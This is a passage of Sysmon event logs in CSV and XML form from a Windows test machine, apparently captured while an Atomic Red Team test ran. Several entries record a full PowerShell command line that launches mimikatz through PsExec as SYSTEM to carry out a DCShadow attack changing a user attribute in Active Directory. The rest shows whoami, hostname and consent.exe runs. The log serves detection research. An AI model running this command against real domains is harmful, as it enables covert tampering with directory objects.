ProcessGuid: {f57bd86a-a4b0-658c-c601-000000000f00}

ProcessId: 10940

Image: C:\Windows\System32\consent.exe

FileVersion: 10.0.22621.2506 (WinBuild.160101.0800)

Description: Consent UI for administrative applications

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: consent.exe

CommandLine: consent.exe 6032 922 000001B71E6A5040

CurrentDirectory: C:\Windows\system32\

User: NT AUTHORITY\SYSTEM

LogonGuid: {f57bd86a-36f5-658c-e703-000000000000}

LogonId: 0x3E7

TerminalSessionId: 1

IntegrityLevel: System

Hashes: MD5=8F81A5DDAA613AE681DA25B86F727E6B,SHA256=8191FB83695F7B60B9D2D137B571EA6FFE34ED6DFAE48866BFBDC934806D5229,IMPHASH=5D0C875DBD930A73D5A983016E384930

ParentProcessGuid: {f57bd86a-36fc-658c-7f00-000000000f00}

ParentProcessId: 6032

ParentImage: C:\Windows\System32\svchost.exe

ParentCommandLine: C:\Windows\system32\svchost.exe -k netsvcs -p -s Appinfo

ParentUser: NT AUTHORITY\SYSTEM</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,2023-12-27 22:26:54.613,,,11,19573,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,0x8000000000000000,Information,,,"File created:

RuleName: -

UtcTime: 2023-12-27 22:26:54.613

ProcessGuid: {f57bd86a-a4ae-658c-c401-000000000f00}

ProcessId: 5368

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

TargetFilename: C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_afv5abvp.z0i.ps1

CreationUtcTime: 2023-12-27 22:26:54.613

User: WINDEV2309EVAL\User",Info,,,,,,,{f57bd86a-a4ae-658c-c401-000000000f00},3588,5368,,"
      ",-,2023-12-27T22:26:54.6269081Z,C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_afv5abvp.z0i.ps1,File created (rule: FileCreate),,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 22:26:54.613,2,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>11</EventID>
      <Version>2</Version>
      <Level>4</Level>
      <Task>11</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T22:26:54.6269081Z""/>
      <EventRecordID>19573</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 22:26:54.613</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-a4ae-658c-c401-000000000f00}</Data>
      <Data Name=""ProcessId"">5368</Data>
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""TargetFilename"">C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_afv5abvp.z0i.ps1</Data>
      <Data Name=""CreationUtcTime"">2023-12-27 22:26:54.613</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>File created:

RuleName: -

UtcTime: 2023-12-27 22:26:54.613

ProcessGuid: {f57bd86a-a4ae-658c-c401-000000000f00}

ProcessId: 5368

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

TargetFilename: C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_afv5abvp.z0i.ps1

CreationUtcTime: 2023-12-27 22:26:54.613

User: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>File created (rule: FileCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"""powershell.exe"" & {# starting fake DC server, as SYSTEM (required)
$dc_output_file = \""""C:\AtomicRedTeam\atomics\..\ExternalPayloads\art-T1207-mimikatz-DC.log\""""
Remove-Item $dc_output_file -ErrorAction Ignore
$mimikatzParam =\""""`\""""log $dc_output_file`\"""" `\""""lsadump::dcshadow /object:bruce.wayne /attribute:badpwdcount /value:9999`\"""" `\""""exit`\""""\""""
$dc = Start-Process -FilePath cmd.exe -Verb Runas -ArgumentList \""""/c 'C:\AtomicRedTeam\atomics\..\ExternalPayloads\PSTools\PsExec.exe' /accepteula -d -s C:\AtomicRedTeam\atomics\..\ExternalPayloads\mimikatz\x64\mimikatz.exe $mimikatzParam\""""

# wait for fake DC server to be ready...
Start-Sleep -Seconds 5

# server ready, so trigger replication (push) and wait until it finished
& \""""C:\AtomicRedTeam\atomics\..\ExternalPayloads\mimikatz\x64\mimikatz.exe\"""" \""""lsadump::dcshadow /push\"""" \""""exit\""""

Write-Host \""""`nWaiting for fake DC server to return\""""
Wait-Process $dc

Write-Host \""""`nOutput from fake DC server:\""""
Get-Content $dc_output_file
Start-Sleep 1 # wait a little until the file is not locked anymore so we can actually delete it
Remove-Item $dc_output_file -ErrorAction Ignore

Write-Host \""""End of DCShadow\""""}",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Windows PowerShell,1,19572,10.0.22621.2506 (WinBuild.160101.0800),"MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,Medium,0x8000000000000000,Information,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,"Process Create:

RuleName: -

UtcTime: 2023-12-27 22:26:54.494

ProcessGuid: {f57bd86a-a4ae-658c-c401-000000000f00}

ProcessId: 5368

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

FileVersion: 10.0.22621.2506 (WinBuild.160101.0800)

Description: Windows PowerShell

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: PowerShell.EXE

CommandLine: ""powershell.exe"" & {# starting fake DC server, as SYSTEM (required)
$dc_output_file = \""""C:\AtomicRedTeam\atomics\..\ExternalPayloads\art-T1207-mimikatz-DC.log\""""
Remove-Item $dc_output_file -ErrorAction Ignore
$mimikatzParam =\""""`\""""log $dc_output_file`\"""" `\""""lsadump::dcshadow /object:bruce.wayne /attribute:badpwdcount /value:9999`\"""" `\""""exit`\""""\""""
$dc = Start-Process -FilePath cmd.exe -Verb Runas -ArgumentList \""""/c 'C:\AtomicRedTeam\atomics\..\ExternalPayloads\PSTools\PsExec.exe' /accepteula -d -s C:\AtomicRedTeam\atomics\..\ExternalPayloads\mimikatz\x64\mimikatz.exe $mimikatzParam\""""

# wait for fake DC server to be ready...
Start-Sleep -Seconds 5

# server ready, so trigger replication (push) and wait until it finished
& \""""C:\AtomicRedTeam\atomics\..\ExternalPayloads\mimikatz\x64\mimikatz.exe\"""" \""""lsadump::dcshadow /push\"""" \""""exit\""""

Write-Host \""""`nWaiting for fake DC server to return\""""
Wait-Process $dc

Write-Host \""""`nOutput from fake DC server:\""""
Get-Content $dc_output_file
Start-Sleep 1 # wait a little until the file is not locked anymore so we can actually delete it
Remove-Item $dc_output_file -ErrorAction Ignore

Write-Host \""""End of DCShadow\""""}

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20

ParentProcessGuid: {00000000-0000-0000-0000-000000000000}

ParentProcessId: 1688

ParentImage: -

ParentCommandLine: -

ParentUser: -",Info,PowerShell.EXE,-,-,{00000000-0000-0000-0000-000000000000},1688,-,{f57bd86a-a4ae-658c-c401-000000000f00},3588,5368,Microsoft® Windows® Operating System,"
      ",-,2023-12-27T22:26:54.4959634Z,,Process Create (rule: ProcessCreate),1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 22:26:54.494,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T22:26:54.4959634Z""/>
      <EventRecordID>19572</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 22:26:54.494</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-a4ae-658c-c401-000000000f00}</Data>
      <Data Name=""ProcessId"">5368</Data>
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.2506 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Windows PowerShell</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">PowerShell.EXE</Data>
      <Data Name=""CommandLine"">""powershell.exe"" &amp; {# starting fake DC server, as SYSTEM (required)
$dc_output_file = \""""C:\AtomicRedTeam\atomics\..\ExternalPayloads\art-T1207-mimikatz-DC.log\""""
Remove-Item $dc_output_file -ErrorAction Ignore
$mimikatzParam =\""""`\""""log $dc_output_file`\"""" `\""""lsadump::dcshadow /object:bruce.wayne /attribute:badpwdcount /value:9999`\"""" `\""""exit`\""""\""""
$dc = Start-Process -FilePath cmd.exe -Verb Runas -ArgumentList \""""/c 'C:\AtomicRedTeam\atomics\..\ExternalPayloads\PSTools\PsExec.exe' /accepteula -d -s C:\AtomicRedTeam\atomics\..\ExternalPayloads\mimikatz\x64\mimikatz.exe $mimikatzParam\""""

# wait for fake DC server to be ready...
Start-Sleep -Seconds 5

# server ready, so trigger replication (push) and wait until it finished
&amp; \""""C:\AtomicRedTeam\atomics\..\ExternalPayloads\mimikatz\x64\mimikatz.exe\"""" \""""lsadump::dcshadow /push\"""" \""""exit\""""

Write-Host \""""`nWaiting for fake DC server to return\""""
Wait-Process $dc

Write-Host \""""`nOutput from fake DC server:\""""
Get-Content $dc_output_file
Start-Sleep 1 # wait a little until the file is not locked anymore so we can actually delete it
Remove-Item $dc_output_file -ErrorAction Ignore

Write-Host \""""End of DCShadow\""""}</Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      <Data Name=""LogonId"">0x2f87b</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20</Data>
      <Data Name=""ParentProcessGuid"">{00000000-0000-0000-0000-000000000000}</Data>
      <Data Name=""ParentProcessId"">1688</Data>
      <Data Name=""ParentImage"">-</Data>
      <Data Name=""ParentCommandLine"">-</Data>
      <Data Name=""ParentUser"">-</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-27 22:26:54.494

ProcessGuid: {f57bd86a-a4ae-658c-c401-000000000f00}

ProcessId: 5368

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

FileVersion: 10.0.22621.2506 (WinBuild.160101.0800)

Description: Windows PowerShell

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: PowerShell.EXE

CommandLine: ""powershell.exe"" &amp; {# starting fake DC server, as SYSTEM (required)
$dc_output_file = \""""C:\AtomicRedTeam\atomics\..\ExternalPayloads\art-T1207-mimikatz-DC.log\""""
Remove-Item $dc_output_file -ErrorAction Ignore
$mimikatzParam =\""""`\""""log $dc_output_file`\"""" `\""""lsadump::dcshadow /object:bruce.wayne /attribute:badpwdcount /value:9999`\"""" `\""""exit`\""""\""""
$dc = Start-Process -FilePath cmd.exe -Verb Runas -ArgumentList \""""/c 'C:\AtomicRedTeam\atomics\..\ExternalPayloads\PSTools\PsExec.exe' /accepteula -d -s C:\AtomicRedTeam\atomics\..\ExternalPayloads\mimikatz\x64\mimikatz.exe $mimikatzParam\""""

# wait for fake DC server to be ready...
Start-Sleep -Seconds 5

# server ready, so trigger replication (push) and wait until it finished
&amp; \""""C:\AtomicRedTeam\atomics\..\ExternalPayloads\mimikatz\x64\mimikatz.exe\"""" \""""lsadump::dcshadow /push\"""" \""""exit\""""

Write-Host \""""`nWaiting for fake DC server to return\""""
Wait-Process $dc

Write-Host \""""`nOutput from fake DC server:\""""
Get-Content $dc_output_file
Start-Sleep 1 # wait a little until the file is not locked anymore so we can actually delete it
Remove-Item $dc_output_file -ErrorAction Ignore

Write-Host \""""End of DCShadow\""""}

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20

ParentProcessGuid: {00000000-0000-0000-0000-000000000000}

ParentProcessId: 1688

ParentImage: -

ParentCommandLine: -

ParentUser: -</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"""C:\Windows\system32\whoami.exe""",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\,whoami - displays logged on user information,1,19571,10.0.22621.1 (WinBuild.160101.0800),"MD5=E0F37DB23E4F3163159A815610DF8CF2,SHA256=574BC2A2995FE2B1F732CCD39F2D99460ACE980AF29EFDF1EB0D3E888BE7D6F0,IMPHASH=62935820E434AF643547B7F5F5BD0292",C:\Windows\System32\whoami.exe,Medium,0x8000000000000000,Information,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,"Process Create:

RuleName: -

UtcTime: 2023-12-27 22:26:53.388

ProcessGuid: {f57bd86a-a4ad-658c-c301-000000000f00}

ProcessId: 940

Image: C:\Windows\System32\whoami.exe

FileVersion: 10.0.22621.1 (WinBuild.160101.0800)

Description: whoami - displays logged on user information

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: whoami.exe

CommandLine: ""C:\Windows\system32\whoami.exe""

CurrentDirectory: C:\Users\User\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=E0F37DB23E4F3163159A815610DF8CF2,SHA256=574BC2A2995FE2B1F732CCD39F2D99460ACE980AF29EFDF1EB0D3E888BE7D6F0,IMPHASH=62935820E434AF643547B7F5F5BD0292

ParentProcessGuid: {00000000-0000-0000-0000-000000000000}

ParentProcessId: 1688

ParentImage: -

ParentCommandLine: -

ParentUser: -",Info,whoami.exe,-,-,{00000000-0000-0000-0000-000000000000},1688,-,{f57bd86a-a4ad-658c-c301-000000000f00},3588,940,Microsoft® Windows® Operating System,"
      ",-,2023-12-27T22:26:53.3911592Z,,Process Create (rule: ProcessCreate),1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 22:26:53.388,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T22:26:53.3911592Z""/>
      <EventRecordID>19571</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 22:26:53.388</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-a4ad-658c-c301-000000000f00}</Data>
      <Data Name=""ProcessId"">940</Data>
      <Data Name=""Image"">C:\Windows\System32\whoami.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.1 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">whoami - displays logged on user information</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">whoami.exe</Data>
      <Data Name=""CommandLine"">""C:\Windows\system32\whoami.exe""</Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      <Data Name=""LogonId"">0x2f87b</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=E0F37DB23E4F3163159A815610DF8CF2,SHA256=574BC2A2995FE2B1F732CCD39F2D99460ACE980AF29EFDF1EB0D3E888BE7D6F0,IMPHASH=62935820E434AF643547B7F5F5BD0292</Data>
      <Data Name=""ParentProcessGuid"">{00000000-0000-0000-0000-000000000000}</Data>
      <Data Name=""ParentProcessId"">1688</Data>
      <Data Name=""ParentImage"">-</Data>
      <Data Name=""ParentCommandLine"">-</Data>
      <Data Name=""ParentUser"">-</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-27 22:26:53.388

ProcessGuid: {f57bd86a-a4ad-658c-c301-000000000f00}

ProcessId: 940

Image: C:\Windows\System32\whoami.exe

FileVersion: 10.0.22621.1 (WinBuild.160101.0800)

Description: whoami - displays logged on user information

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: whoami.exe

CommandLine: ""C:\Windows\system32\whoami.exe""

CurrentDirectory: C:\Users\User\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=E0F37DB23E4F3163159A815610DF8CF2,SHA256=574BC2A2995FE2B1F732CCD39F2D99460ACE980AF29EFDF1EB0D3E888BE7D6F0,IMPHASH=62935820E434AF643547B7F5F5BD0292

ParentProcessGuid: {00000000-0000-0000-0000-000000000000}

ParentProcessId: 1688

ParentImage: -

ParentCommandLine: -

ParentUser: -</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"""C:\Windows\system32\HOSTNAME.EXE""",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\,Hostname APP,1,19570,10.0.22621.2506 (WinBuild.160101.0800),"MD5=E1EA6EFF1F45AA136A2A2E18EACC1F73,SHA256=4634E6685E402CC3CC8843589F4E8D8AC515F5F05D319E835A262B69B32BDB45,IMPHASH=23013EDF627646AB5226D15AC880BAD8",C:\Windows\System32\HOSTNAME.EXE,Medium,0x8000000000000000,Information,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,"Process Create:

RuleName: -

UtcTime: 2023-12-27 22:26:53.359

ProcessGuid: {f57bd86a-a4ad-658c-c201-000000000f00}

ProcessId: 10036

Image: C:\Windows\System32\HOSTNAME.EXE

FileVersion: 10.0.22621.2506 (WinBuild.160101.0800)

Description: Hostname APP

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: hostname.exe

CommandLine: ""C:\Windows\system32\HOSTNAME.EXE""

CurrentDirectory: C:\Users\User\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=E1EA6EFF1F45AA136A2A2E18EACC1F73,SHA256=4634E6685E402CC3CC8843589F4E8D8AC515F5F05D319E835A262B69B32BDB45,IMPHASH=23013EDF627646AB5226D15AC880BAD8

ParentProcessGuid: {00000000-0000-0000-0000-000000000000}

ParentProcessId: 1688

ParentImage: -

ParentCommandLine: -

ParentUser: -",Info,hostname.exe,-,-,{00000000-0000-0000-0000-000000000000},1688,-,{f57bd86a-a4ad-658c-c201-000000000f00},3588,10036,Microsoft® Windows® Operating System,"
      ",-,2023-12-27T22:26:53.3607240Z,,Process Create (rule: ProcessCreate),1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 22:26:53.359,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T22:26:53.3607240Z""/>
      <EventRecordID>19570</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 22:26:53.359</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-a4ad-658c-c201-000000000f00}</Data>
      <Data Name=""ProcessId"">10036</Data>
      <Data Name=""Image"">C:\Windows\System32\HOSTNAME.EXE</Data>
      <Data Name=""FileVersion"">10.0.22621.2506 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Hostname APP</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">hostname.exe</Data>
      <Data Name=""CommandLine"">""C:\Windows\system32\HOSTNAME.EXE""</Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      <Data Name=""LogonId"">0x2f87b</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=E1EA6EFF1F45AA136A2A2E18EACC1F73,SHA256=4634E6685E402CC3CC8843589F4E8D8AC515F5F05D319E835A262B69B32BDB45,IMPHASH=23013EDF627646AB5226D15AC880BAD8</Data>
      <Data Name=""ParentProcessGuid"">{00000000-0000-0000-0000-000000000000}</Data>
      <Data Name=""ParentProcessId"">1688</Data>
      <Data Name=""ParentImage"">-</Data>
      <Data Name=""ParentCommandLine"">-</Data>
      <Data Name=""ParentUser"">-</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-27 22:26:53.359

ProcessGuid: {f57bd86a-a4ad-658c-c201-000000000f00}

ProcessId: 10036

Image: C:\Windows\System32\HOSTNAME.EXE

FileVersion: 10.0.22621.2506 (WinBuild.160101.0800)

Description: Hostname APP

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: hostname.exe

CommandLine: ""C:\Windows\system32\HOSTNAME.EXE""

CurrentDirectory: C:\Users\User\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=E1EA6EFF1F45AA136A2A2E18EACC1F73,SHA256=4634E6685E402CC3CC8843589F4E8D8AC515F5F05D319E835A262B69B32BDB45,IMPHASH=23013EDF627646AB5226D15AC880BAD8

ParentProcessGuid: {00000000-0000-0000-0000-000000000000}

ParentProcessId: 1688

ParentImage: -

ParentCommandLine: -

ParentUser: -</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>

"
